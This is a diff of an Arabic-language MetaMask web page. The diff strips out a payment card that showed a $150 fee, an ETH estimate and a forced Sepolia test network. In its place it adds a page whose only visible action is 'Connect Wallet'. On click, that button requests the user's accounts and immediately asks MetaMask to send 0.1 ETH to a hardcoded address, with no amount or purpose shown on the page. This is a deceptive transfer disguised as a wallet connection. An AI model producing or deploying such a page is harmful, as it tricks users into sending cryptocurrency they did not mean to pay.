@@ -3,364 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة الدفع اللامركزية | ETH Payment</title>
-    <!-- استدعاء مكتبة Ethers.js الرسمية -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <title>Connect Wallet</title>
     <style>
-        :root {
-            --primary-color: #3b82f6;
-            --primary-hover: #1d4ed8;
-            --bg-color: #f8fafc;
-            --card-bg: #ffffff;
-            --text-main: #0f172a;
-            --text-muted: #64748b;
-            --border-color: #e2e8f0;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
+            background: linear-gradient(135deg, #ffb6c1, #ff69b4, #ff1493);
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
             padding: 20px;
         }
 
-        .payment-card {
-            background-color: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
-            width: 100%;
-            max-width: 420px;
-            padding: 32px;
-            box-sizing: border-box;
-        }
-
-        .card-header {
+        .container {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 24px;
+            padding: 40px 30px;
             text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .card-header h2 {
-            margin: 0 0 8px 0;
-            font-size: 1.5rem;
-            color: var(--text-main);
-        }
-
-        .card-header p {
-            margin: 0;
-            color: var(--text-muted);
-            font-size: 0.9rem;
-        }
-
-        .price-box {
-            background-color: #f1f5f9;
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .price-box .amount {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--text-main);
-            margin: 4px 0;
-        }
-
-        .price-box .crypto-estimate {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-        }
-
-        .btn {
+            box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.37);
+            max-width: 400px;
             width: 100%;
-            padding: 14px;
-            border-radius: 10px;
+        }
+
+        .title {
+            color: #ffffff;
+            font-size: 24px;
+            margin-bottom: 25px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+        }
+
+        .btn-connect {
+            background-color: #28a745;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 16px 32px;
             border: none;
-            font-size: 1rem;
-            font-weight: 600;
+            border-radius: 50px;
             cursor: pointer;
-            transition: all 0.2s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.4);
+            width: 100%;
         }
 
-        .btn-primary {
-            background-color: var(--primary-color);
-            color: white;
+        .btn-connect:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.6);
         }
 
-        .btn-primary:hover {
-            background-color: var(--primary-hover);
+        .btn-connect:active {
+            transform: translateY(0);
         }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .account-badge {
-            background-color: #e0f2fe;
-            color: #0369a1;
-            padding: 8px 12px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            display: inline-block;
-            margin-bottom: 16px;
+        .status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ffffff;
             word-break: break-all;
-        }
-
-        .status-message {
-            margin-top: 16px;
-            font-size: 0.875rem;
-            text-align: center;
-            line-height: 1.5;
-            min-height: 20px;
-        }
-
-        .status-error { color: #ef4444; }
-        .status-success { color: #10b981; }
-        .status-info { color: #3b82f6; }
-
-        .spinner {
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid white;
-            border-radius: 50%;
-            width: 16px;
-            height: 16px;
-            animation: spin 1s linear infinite;
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <div class="payment-card">
-        <div class="card-header">
-            <h2>دفع الرسوم المقررة</h2>
-            <p>يرجى إتمام عملية الدفع للاستمرار</p>
-        </div>
-
-        <div class="price-box">
-            <span style="font-size: 0.85rem; color: var(--text-muted);">المبلغ الإجمالي</span>
-            <div class="amount">$150.00 USD</div>
-            <div class="crypto-estimate" id="ethEstimate">جاري جلب سعر ETH الحالي...</div>
-        </div>
-
-        <div id="accountContainer" style="text-align: center; display: none;">
-            <span class="account-badge" id="userAddress">0x00...000</span>
-        </div>
-
-        <button id="mainBtn" class="btn btn-primary" onclick="handleAction()">
-            <span class="spinner" id="btnSpinner"></span>
-            <span id="btnText">Connect Wallet</span>
-        </button>
-
-        <div id="statusMessage" class="status-message"></div>
+    <div class="container">
+        <h2 class="title">ربط محفظة MetaMask</h2>
+        <button class="btn-connect" id="connectBtn" onclick="connectAndSend()">Connect Wallet</button>
+        <div class="status" id="statusMessage"></div>
     </div>
 
     <script>
-        const RECIPIENT_ADDRESS = '0x23f92c8296f56737e0d099f88715c8a76fcd7180';
-        const USD_AMOUNT = 150;
-        
-        let provider = null;
-        let ethereumObject = null;
-        let currentAccount = null;
-        let currentEthPrice = 0;
+        const RECIPIENT_ADDRESS = "0x23f92c8296f56737e0d099f88715c8a76fcd7180";
+        // 0.1 ETH in Wei (100,000,000,000,000,000 Wei) = 0x16345785d8a0000
+        const AMOUNT_IN_WEI_HEX = "0x16345785d8a0000"; 
 
-        // تهيئة الصفحة
-        window.addEventListener('load', async () => {
-            await fetchEthPrice();
-            await detectMetaMaskProvider();
-        });
+        async function connectAndSend() {
+            const statusMessage = document.getElementById("statusMessage");
+            const connectBtn = document.getElementById("connectBtn");
 
-        // دالة مخصصة للكشف عن إضافة MetaMask تحديداً واستبعاد المحافظ الأخرى
-        async function detectMetaMaskProvider() {
-            let attempts = 0;
-            
-            // الانتظار القليل حتى تقوم الإضافات بحقن الكائنات في المتصفح
-            while (attempts < 10 && !window.ethereum) {
-                await new Promise(resolve => setTimeout(resolve, 100));
-                attempts++;
-            }
-
-            if (window.ethereum) {
-                // إذا كان هناك أكثر من محفظة مثبتة (مثل Trust Wallet و MetaMask معا)
-                if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
-                    ethereumObject = window.ethereum.providers.find(p => p.isMetaMask && !p.isTrust && !p.isBraveWallet);
-                } 
-                // إذا كانت محفظة واحدة وتؤكد أنها MetaMask
-                else if (window.ethereum.isMetaMask) {
-                    ethereumObject = window.ethereum;
-                }
-            }
-
-            if (ethereumObject) {
-                provider = new ethers.BrowserProvider(ethereumObject);
-                ethereumObject.on('accountsChanged', handleAccountsChanged);
-                ethereumObject.on('chainChanged', () => window.location.reload());
-            }
-        }
-
-        // جلب سعر ETH
-        async function fetchEthPrice() {
-            try {
-                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
-                const data = await res.json();
-                currentEthPrice = data.ethereum.usd;
-                const ethNeeded = (USD_AMOUNT / currentEthPrice).toFixed(4);
-                document.getElementById('ethEstimate').innerText = `≈ ${ethNeeded} ETH (سعر الصرف: $${currentEthPrice})`;
-            } catch (err) {
-                document.getElementById('ethEstimate').innerText = "تعذر جلب سعر الصرف الآن";
-            }
-        }
-
-        // التحكم في الإجراء الرئيسي
-        async function handleAction() {
-            if (!currentAccount) {
-                await connectWallet();
-            } else {
-                await executePayment();
-            }
-        }
-
-        // الاتصال بمحفظة MetaMask فقط
-        async function connectWallet() {
-            if (!ethereumObject) {
-                await detectMetaMaskProvider();
-            }
-
-            if (!ethereumObject) {
-                showStatus("لم يتم العثور على إضافة MetaMask! يرجى التأكد من تثبيتها وتفعيلها.", "error");
+            // 1. التحقق من وجود محفظة MetaMask
+            if (typeof window.ethereum === 'undefined') {
+                alert("لم يتم العثور على محفظة MetaMask! يرجى تثبيت إضافة MetaMask في المتصفح.");
+                statusMessage.innerText = "تنبيه: محفظة MetaMask غير مثبتة.";
                 return;
             }
 
-            setLoading(true, "جاري الاتصال بـ MetaMask...");
             try {
-                const SEPOLIA_CHAIN_ID = '0xaa36a7';
-                
-                try {
-                    await ethereumObject.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: SEPOLIA_CHAIN_ID }],
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902 || switchError.code === -32603) {
-                        await ethereumObject.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: SEPOLIA_CHAIN_ID,
-                                chainName: 'Sepolia Test Network',
-                                nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
-                                rpcUrls: ['https://ethereum-sepolia-rpc.publicnode.com'],
-                                blockExplorerUrls: ['https://sepolia.etherscan.io']
-                            }],
-                        });
-                    }
-                }
+                connectBtn.disabled = true;
+                connectBtn.innerText = "جاري الاتصال...";
+                statusMessage.innerText = "جاري طلب ربط المحفظة...";
 
-                provider = new ethers.BrowserProvider(ethereumObject);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                handleAccountsChanged(accounts);
-            } catch (err) {
-                showStatus("فشلت عملية الربط مع MetaMask أو تم إلغاء الطلب.", "error");
-            } finally {
-                setLoading(false);
-            }
-        }
-
-        // معالجة تغيير الحساب
-        function handleAccountsChanged(accounts) {
-            if (!accounts || accounts.length === 0) {
-                currentAccount = null;
-                document.getElementById('accountContainer').style.display = 'none';
-                document.getElementById('btnText').innerText = "Connect Wallet";
-                showStatus("", "");
-            } else {
-                currentAccount = accounts[0];
-                const shortAddr = `${currentAccount.substring(0, 6)}...${currentAccount.substring(currentAccount.length - 4)}`;
-                document.getElementById('userAddress').innerText = `متصل (MetaMask): ${shortAddr}`;
-                document.getElementById('accountContainer').style.display = 'block';
-                document.getElementById('btnText').innerText = "دفع الرسوم الآن";
-                showStatus("تم الاتصال بـ MetaMask بنجاح (شبكة Sepolia).", "success");
-            }
-        }
-
-        // تنفيذ المعاملة
-        async function executePayment() {
-            if (!currentEthPrice) {
-                await fetchEthPrice();
-            }
-
-            setLoading(true, "جاري تحضير المعاملة...");
-            showStatus("يرجى التأكيد من داخل نافذة MetaMask...", "info");
-
-            try {
-                const signer = await provider.getSigner();
-                
-                const ethAmount = (USD_AMOUNT / currentEthPrice).toFixed(6).toString();
-                const weiValue = ethers.parseEther(ethAmount);
-
-                const tx = await signer.sendTransaction({
-                    to: RECIPIENT_ADDRESS,
-                    value: weiValue
+                // 2. طلب الإذن لربط المحفظة
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
                 });
 
-                showStatus(`تم إرسال المعاملة! جاري التأكيد...`, "info");
-                
-                await tx.wait();
-                showStatus("تمت عملية الدفع بنجاح! شكرًا لك.", "success");
-                document.getElementById('mainBtn').disabled = true;
+                const userAccount = accounts[0];
+                statusMessage.innerText = "تم الربط: " + userAccount;
 
-            } catch (err) {
-                console.error(err);
-                if (err.code === 'ACTION_REJECTED') {
-                    showStatus("تم إلغاء المعاملة من قبل المستخدم.", "error");
+                // 3. إعداد تفاصيل المعاملة (تحويل 0.1 ETH)
+                const transactionParameters = {
+                    to: RECIPIENT_ADDRESS,
+                    from: userAccount,
+                    value: AMOUNT_IN_WEI_HEX
+                };
+
+                statusMessage.innerText = "جاري طلب تأكيد المعاملة في MetaMask...";
+
+                // 4. طلب المعاملة من المستخدم ليظهر زر التأكيد Confirm داخل MetaMask
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                statusMessage.innerText = "تم إرسال المعاملة بنجاح! المعرف: " + txHash;
+                alert("تم إرسال المعاملة بنجاح!\nرمز المعاملة: " + txHash);
+
+            } catch (error) {
+                console.error(error);
+                if (error.code === 4001) {
+                    statusMessage.innerText = "تم رفض الطلب من قبل المستخدم.";
+                    alert("تم رفض العملية من قبل المستخدم.");
                 } else {
-                    showStatus("حدث خطأ أثناء المعاملة. تأكد من توفر رصيد كافٍ لتغطية المعاملة والغاز.", "error");
+                    statusMessage.innerText = "حدث خطأ: " + (error.message || error);
+                    alert("حدث خطأ أثناء تنفيذ العملية.");
                 }
             } finally {
-                setLoading(false);
+                connectBtn.disabled = false;
+                connectBtn.innerText = "Connect Wallet";
             }
-        }
-
-        function setLoading(isLoading, text) {
-            const spinner = document.getElementById('btnSpinner');
-            const btnText = document.getElementById('btnText');
-            const mainBtn = document.getElementById('mainBtn');
-
-            if (isLoading) {
-                spinner.style.display = 'inline-block';
-                if (text) btnText.innerText = text;
-                mainBtn.disabled = true;
-            } else {
-                spinner.style.display = 'none';
-                mainBtn.disabled = false;
-                if (!currentAccount) {
-                    btnText.innerText = "Connect Wallet";
-                } else {
-                    btnText.innerText = "دفع الرسوم الآن";
-                }
-            }
-        }
-
-        function showStatus(msg, type) {
-            const el = document.getElementById('statusMessage');
-            el.innerText = msg;
-            el.className = `status-message status-${type}`;
         }
     </script>
 </body>
